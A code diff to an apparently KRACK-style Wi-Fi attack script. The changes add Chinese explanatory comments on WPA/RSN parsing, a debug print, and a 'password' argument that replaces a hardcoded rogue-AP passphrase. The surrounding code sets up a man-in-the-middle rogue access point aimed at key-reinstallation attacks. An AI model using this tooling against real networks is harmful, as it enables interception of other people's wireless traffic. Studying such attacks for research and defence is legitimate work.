@@ -67,6 +67,7 @@ class MitmSocket(L2Socket):
 	def _strip_fcs(self, p):
 		# radiotap header flags 0x00...0: no used FCS failed
 		# .present is flagsfield
+		print(p[RadioTap].present)
 		if p[RadioTap].present & 2 != 0:
 			rawframe = str(p[RadioTap])
 			pos = 8 # FCS 在 frame 開頭後第 9 bytes 的地方
@@ -285,24 +286,24 @@ class NetworkConfig():
 		return not self.group_cipher is None and self.wpavers > 0 and \
 			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0
 
-	# TODO: Improved parsing to handle more networks
 	# 解析 RSN 內容
 	def parse_wparsn(self, wparsn):
 		# 群組加密演算法
 		self.group_cipher = ord(wparsn.decode('unicode_escape')[5])
-
+		# 處理 c 語言的struct, H: unsigned short return python integer; <: little-endian
 		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
 		pos = wparsn[8:]
 		for i in range(num_pairwise):
 			self.pairwise_ciphers.add(ord(pos.decode('unicode_escape')[3]))
 			pos = pos[4:]
-
+		# 取出 akm 數量, (authentication and key management, akm)
 		num_akm = struct.unpack("<H", pos[:2])[0]
+		# 取出 akm suite list
 		pos = pos[2:]
 		for i in range(num_akm):
 			self.akms.add(ord(pos.decode('unicode_escape')[3]))
 			pos = pos[4:]
-
+		# RSN capabilities
 		if len(pos) >= 2:
 			self.capab = struct.unpack("<H", pos[:2])[0]
 
@@ -324,8 +325,6 @@ class NetworkConfig():
 
 			el = el.payload
 
-	# TODO: Check that there also isn't a real AP of this network on 
-	# the returned channel (possible for large networks e.g. eduroam).
 	def find_rogue_channel(self):
 		# 強盜 AP 頻道不是在 1 就是 11
 		self.rogue_channel = 1 if self.real_channel >= 6 else 11
@@ -351,7 +350,7 @@ wmm_enabled={wmmenabled}
 wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
-wpa_passphrase=hsng@root"""
+wpa_passphrase={password}"""
 		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
 		ciphers2str = {2: "TKIP", 4: "CCMP"}
 		return TEMPLATE.format(
@@ -364,7 +363,8 @@ wpa_passphrase=hsng@root"""
 			ptksa_counters = (self.capab & 0b001100) >> 2,
 			gtksa_counters = (self.capab & 0b110000) >> 4,
 			wmmadvertised = int(args.group),
-			wmmenabled = self.wmmenabled)
+			wmmenabled = self.wmmenabled,
+			password = str(args.password))
 
 class ClientState():
 	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
@@ -980,6 +980,7 @@ if __name__ == "__main__":
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
 	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
+	parser.add_argument("password", help="The password of the network to attack.")
 
 	# 選擇性參數
 	parser.add_argument("-m", "--nic-rogue-mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
